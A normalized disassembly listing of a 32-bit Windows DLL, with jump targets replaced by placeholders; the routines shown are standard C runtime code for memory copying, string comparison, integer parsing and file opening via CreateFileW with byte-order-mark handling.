lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1007f940
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_10045b14
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1007f9ba
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_10001e8b
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1000a924
add esp 0x20
pop esi
pop ebp
retn
sub_1007f9ed
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10001e8b
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1000a924
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_100574f2
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_10007ef1
pop ebx
leave
retn
sub_1007fa90
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1007fb20
push sub_10057d80
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1007fb79
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_1000380f
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_1007fba8
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
dec [ ebp + 0xc ]
push eax
mov eax ebx
call sub_1007fb79
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x3f
mov eax ebx
call sub_1007fb79
pop ecx
sub_1007fc10
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1007fc98
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1003cbb0
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_1006ee55
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_10017e58
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
call sub_100427ff
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_10017e58
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
call sub_100427ff
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_1002202c
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_10017e58
and [ eax ] 0x0
mov [ esi ] ebx
call sub_1006299d
mov [ eax ] 0x18
call sub_1006299d
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_1001e7b9
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_1001e7b9
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_1006299d
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_1006299d
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_10027ea5
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_10070dd7
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
and [ ebp - 0x28 ] 0x0
push 0x1
lea eax [ ebp - 0x28 ]
push eax
push [ esi ]
call sub_10043037
add esp 0xc
test eax eax
jne r-xdata
call sub_10017e58
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_10070dd7
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x28 ] 0x1a
jne r-xdata
push [ esi ]
call sub_100473b3
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_1001e7b9
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_1002d7c8
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_10029266
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_10043037
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_1004846a
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_1004846a
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_100473b3
pop ecx
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_10070dd7
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_10057f6e
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_10070dd7
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_1004846a
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_1004846a
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_100803cd
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_100091c8
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_10080400
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_100803cd
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_100803cd
sub_10080470
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1008049b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
xor eax eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push 0x8
pop ebx
cmp [ ebp + 0x10 ] 0x2
jl r-xdata
pop edi
leave
retn
movzx esi [ edi ]
push ebx
push esi
add edi 0x2
call sub_1005c227
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp si 0x2d
jne r-xdata
cmp [ ebp + 0x10 ] 0x24
jg r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx esi [ edi ]
add edi 0x2
cmp [ ebp + 0x10 ] 0x10
jne r-xdata
push esi
call sub_1006cf23
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
mov ebx eax
push esi
call sub_1006cf23
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x10
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x14 ]
sub edi 0x2
test al 0x8
jne r-xdata
or [ ebp + 0x14 ] 0x8
cmp [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
imul ecx [ ebp + 0x10 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_1006299d
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
call sub_1006cf23
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp + 0x14 ] 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
test [ ebp + 0x14 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
pop esi
pop ebx
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x4 ]
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
sub_1008065d
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x30 ]
call sub_1001da0a
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
xor ecx ecx
cmp eax ecx
je r-xdata
cmp ebx ecx
jne r-xdata
mov [ eax ] ebx
cmp [ ebp + 0x14 ] ecx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push esi
movzx esi [ ebx ]
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
lea edi [ ebx + 0x2 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x8
push esi
call sub_1005c227
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop ebx
leave
retn
movzx esi [ edi ]
add edi 0x2
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
movzx esi [ edi ]
add edi 0x2
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
xor eax eax
xor edx edx
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x10
pop ebx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
call sub_1006cf23
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
push eax
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
call sub_100823c0
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
push esi
call sub_1006cf23
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x14 ] ebx
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
sub edi 0x2
test al 0x8
jne r-xdata
mov ecx [ ebp - 0x4 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0xc ]
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_10082460
xor ecx ecx
add eax ebx
adc edx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
ja r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_1006299d
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_1006cf23
mov ebx eax
pop ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
lea ebx [ eax - 0x37 ]
sub eax 0x20
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0xc ]
jne r-xdata
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x14 ]
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] esi
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
jmp r-xdata
